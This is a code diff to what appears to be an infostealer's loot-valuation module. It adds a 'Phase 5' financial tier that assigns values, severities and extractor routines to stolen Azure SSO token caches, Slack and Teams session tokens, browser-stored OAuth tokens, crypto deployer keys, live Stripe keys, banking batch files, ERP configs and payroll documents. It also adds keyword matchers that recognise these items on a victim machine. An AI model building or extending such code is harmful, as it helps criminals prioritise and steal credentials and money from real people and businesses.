@@ -31,6 +31,15 @@ class ArtifactType(str, Enum):
     BROWSER_PASSWORD = "browser_password"
     EMAIL_CREDENTIAL = "email_credential"
     GENERIC_SECRET = "generic_secret"
+    # Phase 5 — Financial & High-Leverage
+    AZURE_PRT_CACHE = "azure_prt_cache"          # SSO grant to all enterprise portals
+    BROWSER_WEB_STORAGE = "browser_web_storage"  # IndexedDB/LocalStorage OAuth/JWT tokens
+    ELECTRON_SESSION_TOKEN = "electron_session_token"  # Slack/Teams/etc bearer tokens
+    WEB3_DEVELOPER_SECRET = "web3_developer_secret"    # .env keys, Solana id.json, Foundry KS
+    PAYMENT_GATEWAY_KEY = "payment_gateway_key"        # Stripe sk_live_, PayPal, Square, Plaid
+    BANKING_BATCH_FILE = "banking_batch_file"          # NACHA ACH, SWIFT MT940, SEPA XML
+    ERP_ACCOUNTING_CONFIG = "erp_accounting_config"    # QuickBooks .qbw, SAP saplogon.ini
+    FINANCIAL_DOCUMENT = "financial_document"          # Wire instructions, cap tables, payroll
 
 
 @dataclass(frozen=True)
@@ -70,6 +79,31 @@ DEFAULT_VALUATION_TABLE: Dict[ArtifactType, ArtifactValuationSpec] = {
     ArtifactType.GENERIC_SECRET: ArtifactValuationSpec(
         ArtifactType.GENERIC_SECRET, 15.0, "low", "extract_generic", 0.30
     ),
+    # ── Phase 5 — Financial & High-Leverage ─────────────────────────────────
+    ArtifactType.AZURE_PRT_CACHE: ArtifactValuationSpec(
+        ArtifactType.AZURE_PRT_CACHE, 300.0, "critical", "extract_cloud", 0.97
+    ),
+    ArtifactType.BROWSER_WEB_STORAGE: ArtifactValuationSpec(
+        ArtifactType.BROWSER_WEB_STORAGE, 160.0, "critical", "extract_chrome", 0.86
+    ),
+    ArtifactType.ELECTRON_SESSION_TOKEN: ArtifactValuationSpec(
+        ArtifactType.ELECTRON_SESSION_TOKEN, 140.0, "critical", "extract_chrome", 0.83
+    ),
+    ArtifactType.WEB3_DEVELOPER_SECRET: ArtifactValuationSpec(
+        ArtifactType.WEB3_DEVELOPER_SECRET, 290.0, "critical", "extract_crypto", 0.96
+    ),
+    ArtifactType.PAYMENT_GATEWAY_KEY: ArtifactValuationSpec(
+        ArtifactType.PAYMENT_GATEWAY_KEY, 275.0, "critical", "extract_cloud", 0.95
+    ),
+    ArtifactType.BANKING_BATCH_FILE: ArtifactValuationSpec(
+        ArtifactType.BANKING_BATCH_FILE, 220.0, "critical", "extract_cloud", 0.93
+    ),
+    ArtifactType.ERP_ACCOUNTING_CONFIG: ArtifactValuationSpec(
+        ArtifactType.ERP_ACCOUNTING_CONFIG, 190.0, "critical", "extract_db", 0.90
+    ),
+    ArtifactType.FINANCIAL_DOCUMENT: ArtifactValuationSpec(
+        ArtifactType.FINANCIAL_DOCUMENT, 95.0, "high", "extract_email", 0.70
+    ),
 }
 
 
@@ -94,7 +128,25 @@ class ArtifactValuationTable:
                     return at
 
         lowered = name.lower()
-        if any(k in lowered for k in ("wallet", "metamask", "brave_wallet", "seed", "mnemonic", "phantom", "exodus")):
+        # Phase 5 — financial types (checked first — more specific)
+        if any(k in lowered for k in ("azure_prt", "prt_cache", "wam_cache", "cloudap", "msal", "tokenbroker")):
+            return ArtifactType.AZURE_PRT_CACHE
+        if any(k in lowered for k in ("indexeddb", "localstorage", "web_storage", "browser_web_storage", "leveldb")):
+            return ArtifactType.BROWSER_WEB_STORAGE
+        if any(k in lowered for k in ("electron_session", "slack_session", "teams_session", "electron")):
+            return ArtifactType.ELECTRON_SESSION_TOKEN
+        if any(k in lowered for k in ("solana/id.json", "foundry_keystore", "hardhat_key", "infura_api", "alchemy_key", "deployer_private", "web3_dev", "web3_developer")):
+            return ArtifactType.WEB3_DEVELOPER_SECRET
+        if any(k in lowered for k in ("sk_live_", "stripe_key", "payment_gateway", "paypal_secret", "square_token", "plaid_secret", "twilio_auth")):
+            return ArtifactType.PAYMENT_GATEWAY_KEY
+        if any(k in lowered for k in (".ach", "nacha", "swift", "mt940", "mt101", "sepa", "banking_batch", "wire_transfer", "iban")):
+            return ArtifactType.BANKING_BATCH_FILE
+        if any(k in lowered for k in (".qbw", ".qbb", ".qbm", "saplogon", "sapuilandscape", "quickbooks", "sage_data", "peachtree", "erp_")):
+            return ArtifactType.ERP_ACCOUNTING_CONFIG
+        if any(k in lowered for k in ("wire_instruction", "cap_table", "payroll_export", "invoice", "financial_doc", "voided_check", "direct_deposit")):
+            return ArtifactType.FINANCIAL_DOCUMENT
+        # Original types
+        if any(k in lowered for k in ("wallet", "metamask", "brave_wallet", "seed", "mnemonic", "phantom", "exodus", "ledger_live", "trezor", "electrum", "bitcoin", "wallet.dat")):
             return ArtifactType.WALLET_SEED
         if any(k in lowered for k in ("aws", "gcp", "azure", "iam", "cloud", "sts_token", "kubeconfig")):
             return ArtifactType.CLOUD_IAM_TOKEN
@@ -213,15 +265,17 @@ class TargetIdentity:
         self.artifact_counts[key] = self.artifact_counts.get(key, 0) + 1
         self.total_extracted_root_value = round(self.total_extracted_root_value + root_value, 2)
 
-        if artifact_type == ArtifactType.WALLET_SEED:
+        if artifact_type in (ArtifactType.WALLET_SEED, ArtifactType.WEB3_DEVELOPER_SECRET):
             self.has_wallets = True
-        elif artifact_type == ArtifactType.CLOUD_IAM_TOKEN:
+        elif artifact_type in (ArtifactType.CLOUD_IAM_TOKEN, ArtifactType.AZURE_PRT_CACHE,
+                                ArtifactType.PAYMENT_GATEWAY_KEY):
             self.has_cloud_tokens = True
         elif artifact_type == ArtifactType.SSH_PRIVATE_KEY:
             self.has_ssh_keys = True
-        elif artifact_type == ArtifactType.BROWSER_PASSWORD:
+        elif artifact_type in (ArtifactType.BROWSER_PASSWORD, ArtifactType.BROWSER_WEB_STORAGE,
+                                ArtifactType.ELECTRON_SESSION_TOKEN):
             self.has_browser_store = True
-        elif artifact_type == ArtifactType.DB_CREDENTIAL:
+        elif artifact_type in (ArtifactType.DB_CREDENTIAL, ArtifactType.ERP_ACCOUNTING_CONFIG):
             self.has_db_creds = True
 
         self.recompute_weights()
